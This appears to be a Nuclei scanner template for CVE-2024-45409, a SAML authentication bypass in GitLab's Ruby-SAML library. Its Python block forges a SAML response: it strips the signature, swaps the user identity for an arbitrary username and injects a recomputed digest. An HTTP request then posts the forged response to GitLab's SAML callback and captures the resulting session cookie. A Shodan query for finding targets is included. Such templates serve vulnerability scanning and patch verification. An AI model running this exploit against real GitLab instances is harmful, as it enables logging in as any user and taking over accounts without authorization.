code:
- engine:
  - py
  - python3
  source: "try:\n  from lxml import etree\nexcept ImportError:\n  raise ImportError(\"\
    The 'lxml' library is not installed. Please install it using 'pip install lxml'.\"\
    )\nimport hashlib,os\nimport base64\nfrom datetime import datetime, timedelta\n\
    import urllib.parse\nimport requests\nusername = os.getenv('username')\nif not\
    \ username:\n    username='admin@example.com'\nsaml_response = os.getenv('SAMLResponse')\n\
    xml_content = base64.b64decode(urllib.parse.unquote(saml_response))\nparser =\
    \ etree.XMLParser(remove_blank_text=True)\nroot = etree.fromstring(xml_content,\
    \ parser)\n\nnamespaces = {\n    'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',\n\
    \    'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',\n    'ds': 'http://www.w3.org/2000/09/xmldsig#'\n\
    }\n\nresponse_signature = root.find('./ds:Signature', namespaces)\nif response_signature\
    \ is not None:\n    root.remove(response_signature)\n\nnameid = root.find(\n \
    \   './/saml:NameID',\n    namespaces\n)\nif nameid is not None:\n    nameid.text\
    \ = username\n\nattribute_values = root.findall('.//saml:AttributeValue', namespaces)\n\
    for attr_value in attribute_values:\n    attr_value.text = username\n\nassertion\
    \ = root.find('.//saml:Assertion', namespaces)\nif assertion is not None:\n  \
    \  # Create a deep copy of the assertion for digest calculation\n    assertion_copy\
    \ = etree.fromstring(etree.tostring(assertion))\n    signature_in_assertion =\
    \ assertion_copy.find('.//ds:Signature', namespaces)\n    if signature_in_assertion\
    \ is not None:\n        signature_in_assertion.getparent().remove(signature_in_assertion)\n\
    \    canonicalized_assertion = etree.tostring(\n        assertion_copy, method='c14n',\
    \ exclusive=True, with_comments=False\n    )\n    digest = hashlib.sha256(canonicalized_assertion).digest()\n\
    \    digest_value = base64.b64encode(digest).decode()\nelse:\n    digest_value\
    \ = ''\n\nissuer = root.find('.//saml:Issuer', namespaces)\nif issuer is not None:\n\
    \    parent = issuer.getparent()\n    index = parent.index(issuer)\n    extensions\
    \ = etree.Element('{urn:oasis:names:tc:SAML:2.0:protocol}Extensions')\n    digest_element\
    \ = etree.SubElement(\n        extensions, '{http://www.w3.org/2000/09/xmldsig#}DigestValue'\n\
    \    )\n    digest_element.text = digest_value\n    parent.insert(index + 1, extensions)\n\
    \nmalformed_samlresponse = urllib.parse.quote(base64.b64encode((etree.tostring(\n\
    \            root, pretty_print=False, xml_declaration=True, encoding='UTF-8'\n\
    \        ))))\nprint(malformed_samlresponse)\n"
http:
- extractors:
  - kval:
    - _gitlab_session
    type: kval
  matchers:
  - condition: and
    dsl:
    - contains(header,"known_sign_in")
    - status_code == 302
    type: dsl
  raw:
  - 'POST /users/auth/saml/callback HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    RelayState=undefined&SAMLResponse={{code_response}}

    '
id: CVE-2024-45409
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2024-45409
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-347
    epss-percentile: 0.97253
    epss-score: 0.4139
  description: 'The Ruby SAML library is for implementing the client side of a SAML
    authorization. Ruby-SAML in <= 12.2 and 1.13.0 <= 1.16.0 does not properly verify
    the signature of the SAML Response.

    '
  impact: 'An unauthenticated attacker with access to any signed saml document (by
    the IdP) can thus forge a SAML Response/Assertion with arbitrary contents. This
    would allow the attacker to log in as arbitrary user within the vulnerable system.

    '
  metadata:
    product: gitlab
    shodan-query: http.title:"GitLab"
    vendor: gitlab
    verified: true
  name: GitLab - SAML Authentication Bypass
  reference:
  - https://about.gitlab.com/releases/2024/09/17/patch-release-gitlab-17-3-3-released/
  - https://github.com/omniauth/omniauth-saml/security/advisories/GHSA-cvp8-5r8g-fhvq
  - https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-jw9c-mfg7-9rx2
  - https://blog.projectdiscovery.io/ruby-saml-gitlab-auth-bypass/
  remediation: 'This vulnerability is fixed in 1.17.0 and 1.12.3.

    '
  severity: critical
  tags: cve,cve2024,saml,auth-bypass,gitlab,code,vkev,vuln
